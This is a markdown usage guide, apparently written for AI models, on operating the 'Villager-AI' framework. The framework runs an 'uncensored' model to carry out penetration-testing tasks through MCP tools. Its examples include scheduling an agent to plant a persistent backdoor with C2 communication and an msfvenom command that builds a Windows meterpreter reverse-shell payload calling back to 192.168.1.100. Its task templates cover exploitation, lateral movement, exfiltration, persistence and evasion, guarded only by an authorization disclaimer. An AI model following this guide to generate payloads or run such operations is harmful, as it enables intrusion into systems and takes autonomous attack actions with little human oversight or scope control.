# AI Assistant Guide: Using Villager-AI Framework

## 🚨 CRITICAL: Use Villager MCP Tools

**IMPORTANT**: When working with Villager-AI, AI assistants should use:
1. **Villager MCP tools** - `mcp_villager-proper_*` tools for true Villager architecture
2. **Fallback**: HexStrike MCP tools - `mcp_hexstrike-ai_execute_python_script` for HTTP API calls
3. **NEVER** use direct terminal commands like `curl`, `python`, or shell scripts

## ✅ Current Setup

Villager is running with:
- **Uncensored AI Model**: DeepSeek R1 uncensored via Ollama (100% free)
- **True Villager Architecture**: TaskNode + MCP Client + Agent Scheduler
- **Real Security Tools**: MSFVenom, Nmap, SQLMap, and all Kali Linux tools
- **GitHub Integration**: Tools for repository management and tool discovery

## 🛠️ Available MCP Tools

### Task Management
- `mcp_villager-proper_create_task(abstract, description, verification)` - Create tasks using TaskNode
- `mcp_villager-proper_get_task_status(task_id)` - Get task execution status
- `mcp_villager-proper_list_tasks()` - List all active tasks

### Agent Orchestration
- `mcp_villager-proper_schedule_agent(agent_name, task_input)` - Schedule agents with LLM orchestration

### Tool Management
- `mcp_villager-proper_execute_tool(tool_name, parameters)` - Execute Villager's core tools
- `mcp_villager-proper_list_available_tools()` - List available tools

### System Integration
- `mcp_villager-proper_get_system_status()` - Get comprehensive system status

## 🎯 Usage Examples

### Create a Security Assessment Task
```python
# This will use Villager's TaskNode to decompose and execute
result = mcp_villager-proper_create_task(
    abstract="Comprehensive security assessment of target network",
    description="Perform reconnaissance, vulnerability scanning, and exploitation attempts on 192.168.1.0/24 using appropriate tools from Kali Linux",
    verification="Provide detailed report with findings, vulnerabilities, and exploitation results"
)
```

### Schedule an Agent for Complex Operations
```python
# This uses Villager's Agent Scheduler with LLM orchestration
result = mcp_villager-proper_schedule_agent(
    agent_name="Advanced Pentest Agent",
    task_input="Create a persistent backdoor on the target system using msfvenom and establish C2 communication"
)
```

### Execute Tools Directly
```python
# This uses Villager's Tools Manager
result = mcp_villager-proper_execute_tool(
    tool_name="os_execute_cmd",
    parameters={"system_command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"}
)
```

## 🔧 Fallback: HexStrike MCP Tools

If Villager MCP tools are not available, use HexStrike tools:

### Create Agents via HTTP API
```python
mcp_hexstrike-ai_execute_python_script(
    script="""
import urllib.request
import json

# Create an agent
agent_data = {
    "name": "Your_Agent_Name",
    "task": "Detailed task description with analysis steps, execution methods, expected outcomes, and reporting requirements"
}

json_data = json.dumps(agent_data).encode('utf-8')
req = urllib.request.Request(
    "http://127.0.0.1:37695/api/agents/create",
    data=json_data,
    headers={'Content-Type': 'application/json'},
    method='POST'
)

with urllib.request.urlopen(req, timeout=30) as response:
    if response.status == 200:
        result = json.loads(response.read().decode('utf-8'))
        print("✅ Agent created successfully!")
        print(f"Agent ID: {result.get('id')}")
    else:
        print(f"❌ Failed to create agent: {response.status}")
"""
)
```

### List Active Agents
```python
mcp_hexstrike-ai_execute_python_script(
    script="""
import urllib.request
import json

with urllib.request.urlopen("http://127.0.0.1:37695/api/agents", timeout=10) as response:
    if response.status == 200:
        data = json.loads(response.read().decode('utf-8'))
        print("🤖 Active Agents:")
        for agent in data.get('agents', []):
            print(f"  • {agent['name']} - Status: {agent['status']} - Progress: {agent['progress']}%")
    else:
        print(f"❌ Failed to list agents: {response.status}")
"""
)
```

## 🎯 Pre-built Agent Templates

### Bug Bounty Hunter Agent
```python
mcp_villager-proper_create_task(
    abstract="Bug Bounty Hunter Agent",
    description="""Perform comprehensive bug bounty reconnaissance and vulnerability assessment.

ANALYSIS STEPS:
1. Target reconnaissance and subdomain enumeration
2. Port scanning and service identification  
3. Web application discovery and mapping
4. Technology stack fingerprinting
5. Vulnerability scanning with multiple tools
6. Manual testing for common bug bounty targets (XSS, SQLi, IDOR, SSRF, etc.)
7. API endpoint discovery and testing
8. Authentication bypass attempts
9. Business logic vulnerability testing
10. Report generation with proof-of-concept examples

EXECUTION METHODS:
- Use automated tools (Nuclei, SQLMap, Burp Suite, etc.) for initial scanning
- Perform manual testing for complex vulnerabilities
- Test for OWASP Top 10 and OWASP API Top 10 vulnerabilities
- Focus on high-impact findings (RCE, authentication bypass, data exposure)
- Document all findings with screenshots and proof-of-concept code

EXPECTED OUTCOMES:
- Comprehensive vulnerability report
- Prioritized list of findings by severity
- Proof-of-concept exploits for critical vulnerabilities
- Recommendations for remediation
- Compliance with responsible disclosure practices""",
    verification="Provide detailed report with findings, risk assessment, and remediation recommendations"
)
```

### Penetration Testing Agent
```python
mcp_villager-proper_create_task(
    abstract="Penetration Testing Agent",
    description="""Perform comprehensive penetration testing with full attack simulation.

PHASES:
1. Reconnaissance and Information Gathering
2. Vulnerability Assessment and Analysis
3. Exploitation and Access Attempts
4. Post-Exploitation and Lateral Movement
5. Data Exfiltration Simulation
6. Persistence and Backdoor Testing
7. Cleanup and Evidence Collection
8. Comprehensive Reporting

TOOLS AND TECHNIQUES:
- Network scanning and enumeration
- Web application testing
- Social engineering simulation
- Privilege escalation attempts
- Network pivoting and lateral movement
- Data collection and analysis
- Stealth and evasion techniques

DELIVERABLES:
- Executive summary with risk assessment
- Technical vulnerability report
- Proof-of-concept demonstrations
- Remediation recommendations
- Compliance assessment""",
    verification="Provide comprehensive penetration test report with findings, exploitation results, and remediation recommendations"
)
```

## 🔧 GitHub Integration

Villager includes comprehensive GitHub integration:

### GitHub Tools Available
```python
# Execute GitHub tools through Villager
mcp_villager-proper_execute_tool(
    tool_name="github_tools",
    parameters={
        "method": "get_repo_info",
        "owner": "organization",
        "repo": "repository-name"
    }
)
```

### Available GitHub Methods
- `get_repo_info(owner, repo)` - Get repository information
- `list_repos(org)` - List organization repositories
- `create_issue(owner, repo, title, body)` - Create GitHub issues
- `search_repos(query)` - Search for repositories
- `get_file_content(owner, repo, path)` - Get file contents
- `create_pull_request(owner, repo, title, head, base, body)` - Create pull requests

## 🚨 Important Notes for AI Assistants

1. **Always use Villager MCP tools** - Never use direct terminal commands
2. **Use urllib, not requests** - The HexStrike environment doesn't have the requests module
3. **Agent-first approach** - Create agents for complex tasks, not direct execution
4. **Proper error handling** - Always check response status codes
5. **Timeout considerations** - Set appropriate timeouts for long-running operations
6. **Resource management** - Monitor agent status and progress
7. **Security awareness** - Remember this is for authorized testing only

## 🔧 Troubleshooting

### If Villager MCP tools return "Not connected":
1. **Check if Villager server is running:**
   ```bash
   ps aux | grep villager_server | grep -v grep
   ```

2. **Start the Villager server:**
   ```bash
   cd /path/to/your/Villager-AI
   source villager-venv-new/bin/activate
   ./start_villager_proper.sh
   ```

3. **Verify servers are running:**
   ```bash
   ps aux | grep -E "(villager_server|hexstrike_server)" | grep -v grep
   ```

### If you get "ModuleNotFoundError: No module named 'requests'":
- Use `urllib.request` instead of `requests` in your scripts
- The HexStrike environment has `urllib` but not `requests`

## 📋 Quick Reference Commands

```python
# Check server status
mcp_villager-proper_get_system_status()

# List agents
mcp_villager-proper_list_tasks()

# Create a simple task
mcp_villager-proper_create_task(
    abstract="Test Task",
    description="Simple test task",
    verification="Task completed successfully"
)
```

---

**Remember**: This system is designed for authorized security testing and research purposes only. Always ensure you have proper authorization before conducting any security assessments.